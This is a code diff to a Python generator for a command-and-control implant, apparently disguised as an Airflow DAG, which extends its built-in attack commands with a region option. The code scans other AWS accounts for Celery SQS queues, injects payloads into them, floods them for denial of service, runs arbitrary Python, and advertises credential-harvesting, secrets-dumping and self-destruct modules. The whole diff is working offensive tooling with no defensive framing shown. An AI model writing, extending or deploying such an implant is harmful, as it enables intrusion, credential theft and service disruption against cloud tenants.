@@ -572,9 +572,11 @@ def generate_c2_implant_dag(
                             pass
             return "Removed: " + ", ".join(removed)
 
-        def _builtin_recon(accounts_csv):
-            """Scan comma-separated account IDs for airflow-celery-* queues."""
-            sqs = boto3.client("sqs", region_name=ATTACKER_REGION)
+        def _builtin_recon(accounts_csv, region=None):
+            """Scan comma-separated account IDs for airflow-celery-* queues.
+            Optional region parameter; defaults to the implant's own region.
+            """
+            sqs = boto3.client("sqs", **({{"region_name": region}} if region else {{}}))
             suffixes = [
                 "prod", "production", "dev", "development", "staging",
                 "stage", "test", "default", "main", "primary",
@@ -600,18 +602,28 @@ def generate_c2_implant_dag(
                 "scan_type": "recon",
                 "discovered": discovered,
                 "accounts_scanned": len(accounts),
+                "region": region or "default",
             }}, indent=2, default=str)
 
         def _builtin_inject(args_str):
             """Inject a JSON payload into a target queue.
-            Usage: !inject <account_id> <queue_name> <json_payload>
+            Usage: !inject <account_id> <queue_name> <json_payload> [region]
             """
-            parts = args_str.strip().split(" ", 2)
+            parts = args_str.strip().split(" ", 3)
             if len(parts) < 3:
-                return "Usage: !inject <account_id> <queue_name> <json_payload>"
-            acct, queue_name, payload_json = parts
-            queue_url = f"https://sqs.{{ATTACKER_REGION}}.amazonaws.com/{{acct}}/{{queue_name}}"
-            sqs = boto3.client("sqs", region_name=ATTACKER_REGION)
+                return "Usage: !inject <account_id> <queue_name> <json_payload> [region]"
+            acct = parts[0]
+            queue_name = parts[1]
+            # Last token might be a region if there are 4+ parts
+            if len(parts) == 4:
+                payload_json = parts[2]
+                region = parts[3]
+            else:
+                payload_json = parts[2]
+                region = None
+            sqs = boto3.client("sqs", **({{"region_name": region}} if region else {{}}))
+            actual_region = sqs.meta.region_name
+            queue_url = f"https://sqs.{{actual_region}}.amazonaws.com/{{acct}}/{{queue_name}}"
             try:
                 sqs.send_message(QueueUrl=queue_url, MessageBody=payload_json)
                 return f"Injected payload into {{queue_url}}"
@@ -620,16 +632,21 @@ def generate_c2_implant_dag(
 
         def _builtin_dos_flood(args_str):
             """Flood a target queue with messages.
-            Usage: !dos-flood <account_id> <queue_name> [count]
+            Usage: !dos-flood <account_id> <queue_name> [count] [region]
             """
             parts = args_str.strip().split()
             if len(parts) < 2:
-                return "Usage: !dos-flood <account_id> <queue_name> [count]"
+                return "Usage: !dos-flood <account_id> <queue_name> [count] [region]"
             acct = parts[0]
             queue_name = parts[1]
-            count = min(int(parts[2]), 1000) if len(parts) >= 3 else 100
-            queue_url = f"https://sqs.{{ATTACKER_REGION}}.amazonaws.com/{{acct}}/{{queue_name}}"
-            sqs = boto3.client("sqs", region_name=ATTACKER_REGION)
+            try:
+                count = min(int(parts[2]), 1000) if len(parts) >= 3 else 100
+            except ValueError:
+                return "Invalid count. Usage: !dos-flood <account_id> <queue_name> [count] [region]"
+            region = parts[3] if len(parts) >= 4 else None
+            sqs = boto3.client("sqs", **({{"region_name": region}} if region else {{}}))
+            actual_region = sqs.meta.region_name
+            queue_url = f"https://sqs.{{actual_region}}.amazonaws.com/{{acct}}/{{queue_name}}"
             sent = 0
             for i in range(count):
                 try:
@@ -697,10 +714,14 @@ def generate_c2_implant_dag(
                         return "", str(e), 1
                 return "", "Usage: !pivot <account_id> <queue_name> <message>", 1
 
-            # 5. Recon: !recon <acct1,acct2,...>
+            # 5. Recon: !recon <acct1,acct2,...> [region]
             if command.strip().startswith("!recon "):
                 args = command.strip()[len("!recon "):].strip()
                 try:
+                    # Last space-separated token may be a region
+                    tokens = args.rsplit(None, 1)
+                    if len(tokens) == 2 and "-" in tokens[1] and "," not in tokens[1]:
+                        return _builtin_recon(tokens[0], region=tokens[1]), "", 0
                     return _builtin_recon(args), "", 0
                 except Exception as e:
                     return "", traceback.format_exc(), 1
@@ -739,9 +760,9 @@ def generate_c2_implant_dag(
                 return "\\n".join(all_stdout), "\\n".join(all_stderr), final_rc
 
             # 9. Python execution with stdout/stderr capture
-            if command.startswith("python:"):
+            if command.strip().startswith("python:"):
                 try:
-                    py_code = command[7:]
+                    py_code = command.strip()[7:]
                     out_buf = io.StringIO()
                     err_buf = io.StringIO()
                     exec_globals = {{
@@ -793,9 +814,9 @@ def generate_c2_implant_dag(
                     "!read-file <path>",
                     "!write-file <path> <b64>",
                     "!pivot <acct> <queue> <msg>",
-                    "!recon <acct1,acct2,...>",
-                    "!inject <acct> <queue> <json>",
-                    "!dos-flood <acct> <queue> [n]",
+                    "!recon <acct1,acct2,...> [region]",
+                    "!inject <acct> <queue> <json> [region]",
+                    "!dos-flood <acct> <queue> [n] [region]",
                     "!multi",
                     "python:<code>",
                 ],
@@ -872,8 +893,8 @@ def generate_c2_implant_dag(
         print_info(f"  Poll interval: {poll_interval_minutes}m + {jitter_seconds}s jitter")
         print_info(f"  Built-in modules: !harvest-creds, !airflow-dump, !s3-recon, "
                    f"!secrets, !ssm-params, !iam-enum, !network-recon, !self-destruct")
-        print_info(f"  Remote attacks: !recon <accts>, !inject <acct> <queue> <json>, "
-                   f"!dos-flood <acct> <queue> [n]")
+        print_info(f"  Remote attacks: !recon <accts> [region], !inject <acct> <queue> <json> [region], "
+                   f"!dos-flood <acct> <queue> [n] [region]")
         print_info(f"  File ops: !read-file <path>, !write-file <path> <b64>")
         print_info(f"  Pivot: !pivot <account_id> <queue_name> <message>")
         print_info(f"  Multi-cmd: !multi\\ncmd1\\ncmd2")
